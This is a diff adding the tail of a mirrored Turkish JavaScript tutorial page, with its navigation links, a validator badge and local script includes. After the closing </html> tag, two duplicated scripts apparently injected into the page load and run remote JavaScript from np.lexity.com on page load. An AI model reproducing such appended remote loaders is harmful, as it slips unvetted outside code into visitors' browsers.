+		<p class="indent" id="b2.5.9-uyg-1-sonuç-1">
+		</p>
+		<ul id="navbottom">
+			<li id="index">
+				<a href="../index.html"><em>« Indeks</em></a>
+			</li>
+			<li id="denge"></li>
+			<li id="sayfa">
+				<a href="b2s4.html"><em>« Önceki</em></a>
+			</li>
+			<li id="denge1"></li>
+			<li id="kodlama">
+				<a href="b2s6.html"><em>Sonraki »</em></a>
+			</li>
+			<li id="navbottom-sonlama"></li>
+	</ul>
+		<p class="pl-50">
+		<a href="http://validator.w3.org/#validate_by_upload"><img 
+				src="../images/valid-xhtml11.png" alt="Valid XHTML 1.1"
+				height="31" width="88" /></a>
+		</p>
+		<!-- Script Yükleme Alanı Başlangıcı-->
+		<script type="text/javascript" src="../js/lastmodified.js">
+		</script>
+		<script type="text/javascript" src="../js/bdelib.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.2-uyg-1.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.3-uyg-1.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.3-uyg-2.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.5-uyg-1.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.5-uyg-2.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.5-uyg-3.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.5-uyg-4.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.5-uyg-5.js">
+		</script>
+	<script type="text/javascript" src="../js/b2.5.5-uyg-6.js">
+		</script> 
+<!--			<script type="text/javascript" src="../js/b2.5.6-uyg-1.js">
+		</script>-->
+		<script type="text/javascript" src="../js/b2.5.6-uyg-2.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.8-uyg-2.js">
+		</script>
+		<script type="text/javascript" src="../js/b2.5.9-uyg-1.js">
+		</script>
+		<!-- Script Yükleme Alanı Sonu-->
+	</body>
+
+<!-- Mirrored from www.bedriemir.com/JavaScript/b2/b2s5.htm by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 15 Feb 2018 03:11:48 GMT -->
+</html>
+<script type="text/javascript">(function (d, w) {var x = d.getElementsByTagName('SCRIPT')[0];var f = function () {var s = d.createElement('SCRIPT');s.type = 'text/javascript';s.async = true;s.src = "http://np.lexity.com/embed/YW/cb0fe9627853342a97c14da72e546d48?id=ef27cd74292a";x.parentNode.insertBefore(s, x);};w.attachEvent ? w.attachEvent('onload',f) :w.addEventListener('load',f,false);}(document, window));</script><script type="text/javascript">(function (d, w) {var x = d.getElementsByTagName('SCRIPT')[0];var f = function () {var s = d.createElement('SCRIPT');s.type = 'text/javascript';s.async = true;s.src = "http://np.lexity.com/embed/YW/cb0fe9627853342a97c14da72e546d48?id=ef27cd74292a";x.parentNode.insertBefore(s, x);};w.attachEvent ? w.attachEvent('onload',f) :w.addEventListener('load',f,false);}(document, window));</script>
